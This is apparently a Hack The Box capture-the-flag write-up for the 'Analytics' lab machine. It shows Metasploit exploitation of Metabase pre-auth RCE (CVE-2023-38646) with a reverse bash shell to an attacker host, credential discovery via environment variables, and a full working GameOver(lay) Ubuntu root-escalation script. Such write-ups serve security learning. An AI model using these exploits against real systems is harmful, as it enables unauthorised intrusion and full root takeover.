# Decoding the Cyber Maze: Metabase Pre-Authentication RCE in 'Analytics Machine'.

![Analytics by Mr  Govind Dubey ](https://github.com/MrGovindDubey/HTB-Machines/assets/118271775/5389b04e-7de8-4994-ac76-e5dbc4d79727)

## Introduction

Brace yourselves for a deep dive into the captivating realm of machine "analytics". In this exploration, we'll unravel the intricacies of analyzing machines, with a specific emphasis on the fascinating landscape of Metabase Remote Code Execution (RCE). We dissect the architecture, employing cutting-edge techniques to unveil the hidden steps that illuminate the profound world of machine analysis.

## Enumeration
An Nmap scan reveals a website at analytical.htb:

```bash
┌──(yury㉿kali)-[~/Documents/htb/analytics/CVE-2023-38646]
└─$ nmap analytical.htb
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-15 04:21 PDT
Nmap scan report for analytical.htb (10.10.11.233)
Host is up (0.28s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
8402/tcp filtered abarsd
```

## Found a login page there
The website has a login page which goes to the _data.analytical.htb_ subdomain. This login page is using Metabase.



## discovered an exploit within metasploit
While scouring the internet for details on Metabase exploits, I stumbled upon this information and grasped the underlying vulnerability gives us CVE-2023-38646 ( Chaining our way to Pre-Auth RCE in Metabase ) . 


```bash
msf > search metabase

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/linux/http/metabase_setup_token_rce  2023-07-22       excellent  Yes    Metabase Setup Token RCE

msf > use exploit/linux/http/metabase_setup_token_rce
[*] Using configured payload cmd/unix/reverse_bash

```

#### Let's immerse ourselves in the task at hand by configuring our rhost, lhost, and rport settings for impactful exploits in Metasploit.

```bash
msf exploit(linux/http/metabase_setup_token_rce) > set RHOST data.analytical.htb
RHOST => data.analytical.htb
msf exploit(linux/http/metabase_setup_token_rce) > set LHOST 10.10.15.63
LHOST => 10.10.15.63
msf exploit(linux/http/metabase_setup_token_rce) > set RPORT 80
RPORT => 80
```
 #### Once completing the setup, feel free to proceed with executing the exploit.

```bash
msf exploit(linux/http/metabase_setup_token_rce) > run

[*] Started reverse TCP handler on 10.10.15.63:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version Detected: 0.46.6
[+] Found setup token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
[*] Sending exploit (may take a few seconds)
[*] Command shell session 1 opened (10.10.15.63:4444 -> 10.10.11.233:39036) at 2023-10-15 05:24:31 -0700

```

#### I commence the enumeration process to facilitate container escape. My first step involves scrutinizing potential environment variables through the execution of the 'env' command.

```bash 
env
MB_LDAP_BIND_DN=
LANGUAGE=en_US:en
USER=metabase
HOSTNAME=151580f52dbb
FC_LANG=en-US
SHLVL=5
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
HOME=/home/metabase
MB_EMAIL_SMTP_PASSWORD=
LC_CTYPE=en_US.UTF-8
JAVA_VERSION=jdk-11.0.19+7
LOGNAME=metabase
_=/bin/sh
MB_DB_CONNECTION_URI=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_PASS=
MB_JETTY_HOST=0.0.0.0
META_PASS=**************
LANG=en_US.UTF-8
MB_LDAP_PASSWORD=
SHELL=/bin/sh
MB_EMAIL_SMTP_USERNAME=
MB_DB_USER=
META_USER=metalytics
LC_ALL=en_US.UTF-8
JAVA_HOME=/opt/java/openjdk
PWD=/
MB_DB_FILE=//metabase.db/metabase.db 
```

#### I found the password. Now, let’s use it to log in with ssh to the machine.

```bash
metalytics@analytics:~$ ls
user.txt 
```

<br></br>

## Privilege Escalation

```bash 
metalytics@analytics:~$ uname -a
Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jan 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
```

#### I utilized a script meticulously crafted for Linux privilege escalation on the targeted machine.

```bash 
metalytics@analytics:~$ cd ../../tmp
metalytics@analytics:/tmp$ nano exploit.sh
metalytics@analytics:/tmp$ cat exploit.sh 
#!/bin/bash

# CVE-2023-2640 CVE-2023-3262: GameOver(lay) Ubuntu Privilege Escalation

echo "[+] You should be root now"
echo "[+] Type 'exit' to finish and leave the house cleaned"

unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
metalytics@analytics:/tmp$ chmod +x exploit.sh 
```

## Ready to kick things off? Simply proceed by executing the exploit.sh file!"

```bash 
metalytics@analytics:/tmp$ ./exploit.sh 
[+] You should be root now
[+] Type 'exit' to finish and leave the house cleaned
root@analytics:/tmp# whoami
root
root@analytics:/tmp# cat ../../root/root.txt

```
